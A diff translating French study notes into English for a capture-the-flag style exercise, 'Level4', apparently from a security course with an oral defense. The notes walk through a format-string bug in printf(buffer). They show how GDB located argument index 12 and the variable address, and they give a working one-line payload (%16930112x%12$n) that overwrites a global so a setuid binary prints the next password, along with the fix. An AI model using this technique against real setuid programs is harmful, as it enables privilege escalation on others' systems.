@@ -1,44 +1,44 @@
 # Level4 - Exam Notes
 
 ## 1. Objective
-Afficher le mot de passe level5. Le binaire est setuid level5 ; si `m` (0x8049810) vaut 0x1025544 (16930116), il exécute `system("/bin/cat /home/user/level5/.pass")`.
+Display the level5 password. The binary is setuid level5; if `m` (0x8049810) equals 0x1025544 (16930116), it executes `system("/bin/cat /home/user/level5/.pass")`.
 
 ## 2. Initial diagnosis (before GDB)
-- **Fonctions suspectes :** `p(buffer)` fait **printf(buffer)** → format string. Variable `m` @ 0x8049810 ; si m == 16930116 → /bin/cat affiche le mot de passe.
-- **Entrée utilisateur :** buffer lu par fgets, passé à p() puis à printf.
-- **Succès :** écrire 16930116 en mémoire à 0x8049810 via %n.
-- **Hypothèse :** format string ; il faut trouver l’index k pour lequel l’argument de printf pointe vers notre buffer (où on mettra l’adresse de m), puis %16930112x%k$n (4+16930112=16930116).
+- **Suspicious functions:** `p(buffer)` does **printf(buffer)** → format string. Variable `m` @ 0x8049810; if m == 16930116 → /bin/cat displays the password.
+- **User input:** buffer read by fgets, passed to p() then to printf.
+- **Success:** write 16930116 into memory at 0x8049810 via %n.
+- **Hypothesis:** format string; need to find the index k for which the printf argument points to our buffer (where we'll put the address of m), then %16930112x%k$n (4+16930112=16930116).
 
 ## 3. GDB diagnosis (how the vulnerability was found)
-- **Où break :** après printf dans p(), ou avant la lecture de m. But : vérifier la valeur de m et trouver l’index du buffer.
-- **Index du buffer :** envoyer "AAAA" + "%1$p" + "%2$p" + … + "%15$p" (ou un fichier avec cette chaîne). Repérer quel %k$p affiche **0x41414141** (ou l’adresse du buffer). Sur l’ISO officielle **k = 12**. Cela prouve que le 12e argument pointe vers notre buffer (les 4 premiers octets "AAAA").
-- **Adresse de m :** 0x8049810 (symbole ou readelf). On met cette adresse au début du buffer à la place de "AAAA".
-- **Valeur à écrire :** 16930116 = 0x1025544. Avec un seul %n : on imprime 4 (adresse) + 16930112 = 16930116 caractères, puis %12$n écrit 16930116 à 0x8049810.
-- **Contrôle du flux :** après printf, `x/wx 0x8049810` doit valoir 0x1025544 ; le programme exécute alors /bin/cat et affiche le mot de passe à la fin (sortie très longue).
+- **Where to break:** after printf in p(), or before reading m. Goal: verify the value of m and find the buffer index.
+- **Buffer index:** send "AAAA" + "%1$p" + "%2$p" + … + "%15$p" (or a file with this string). Identify which %k$p displays **0x41414141** (or the buffer address). On the official ISO **k = 12**. This proves that the 12th argument points to our buffer (the first 4 bytes "AAAA").
+- **Address of m:** 0x8049810 (symbol or readelf). Put this address at the start of the buffer instead of "AAAA".
+- **Value to write:** 16930116 = 0x1025544. With a single %n: print 4 (address) + 16930112 = 16930116 characters, then %12$n writes 16930116 to 0x8049810.
+- **Flow control:** after printf, `x/wx 0x8049810` should be 0x1025544; the program then executes /bin/cat and displays the password at the end (very long output).
 
 ## 4. Building the exploit command
-- **Cible :** écrire 16930116 à l’adresse 0x8049810 (m).
-- **Structure :** [4 octets = 0x8049810 LE] + "%16930112x" + "%12$n". L’index 12 vient du dump GDB (AAAA + %k$p). 4 + 16930112 = 16930116.
-- **Encodage :** `\x10\x98\x04\x08`. Python : `print "\x10\x98\x04\x08" + "%16930112x%12$n"`.
-- **Invocation :** `python -c '...' | ./level4`. Pas besoin de garder stdin ouvert (le programme affiche puis termine). Attendre 10–30 s (sortie ~16 Mo).
-- **Référence commands.md :** section Exploitation. Si 12 ne marche pas sur une autre VM, refaire le dump pour trouver k et remplacer 12 par k.
+- **Target:** write 16930116 to address 0x8049810 (m).
+- **Structure:** [4 bytes = 0x8049810 LE] + "%16930112x" + "%12$n". Index 12 comes from the GDB dump (AAAA + %k$p). 4 + 16930112 = 16930116.
+- **Encoding:** `\x10\x98\x04\x08`. Python: `print "\x10\x98\x04\x08" + "%16930112x%12$n"`.
+- **Invocation:** `python -c '...' | ./level4`. No need to keep stdin open (the program prints then exits). Wait 10–30 s (~16 MB of output).
+- **Reference commands.md:** section Exploitation. If 12 doesn't work on another VM, redo the dump to find k and replace 12 with k.
 
 ## 5. Exploitation logic
-Format string dans p() : printf(buffer). On met l’adresse de m au début du buffer ; l’argument à l’index 12 (trouvé par dump) pointe vers cette adresse. %16930112x%12$n écrit 16930116 à m → le programme lance /bin/cat et affiche le mot de passe.
+Format string in p(): printf(buffer). We put the address of m at the start of the buffer; the argument at index 12 (found by dump) points to that address. %16930112x%12$n writes 16930116 to m → the program runs /bin/cat and displays the password.
 
 ## 6. Reproducible procedure (for evaluation)
-- **Commande :** `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`. Mot de passe level5 à la fin de la sortie.
-- **Résultat attendu :** après un long délai, le mot de passe level5 s’affiche.
-- **À dire :** « Format string ; j’ai trouvé l’index 12 avec AAAA + %k$p. J’écris 16930116 à l’adresse de m avec %16930112x%12$n. »
+- **Command:** `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`. Level5 password at the end of the output.
+- **Expected result:** after a long delay, the level5 password is displayed.
+- **What to say:** "Format string; I found index 12 with AAAA + %k$p. I write 16930116 to the address of m with %16930112x%12$n."
 
 ## 7. Oral defense points
-- **Bug :** printf(buffer) dans p(), format string contrôlée par l’utilisateur.
-- **GDB :** dump pour index 12 ; adresse de m 0x8049810 ; après exploit, m = 0x1025544.
-- **Payload :** adresse m + %16930112x + %12$n.
-- **Fix :** printf("%s", buffer).
+- **Bug:** printf(buffer) in p(), format string controlled by the user.
+- **GDB:** dump for index 12; address of m 0x8049810; after exploit, m = 0x1025544.
+- **Payload:** address of m + %16930112x + %12$n.
+- **Fix:** printf("%s", buffer).
 
 ## 8. Common evaluator questions
-- **Pourquoi 16930112 ?** 16930116 - 4 (octets de l’adresse) ; %n écrit le nombre total d’octets imprimés.
-- **Comment trouver 12 ?** Envoyez "AAAA" + "%1$p"... ; le k qui affiche 0x41414141 (ou l’adresse du buffer) est l’index du buffer.
-- **Pourquoi la sortie est si longue ?** %16930112x imprime 16930112 caractères.
-- **Où est m ?** 0x8049810 (variable globale).
+- **Why 16930112?** 16930116 - 4 (address bytes); %n writes the total number of printed bytes.
+- **How do you find 12?** Send "AAAA" + "%1$p"...; the k that displays 0x41414141 (or the buffer address) is the buffer index.
+- **Why is the output so long?** %16930112x prints 16930112 characters.
+- **Where is m?** 0x8049810 (global variable).
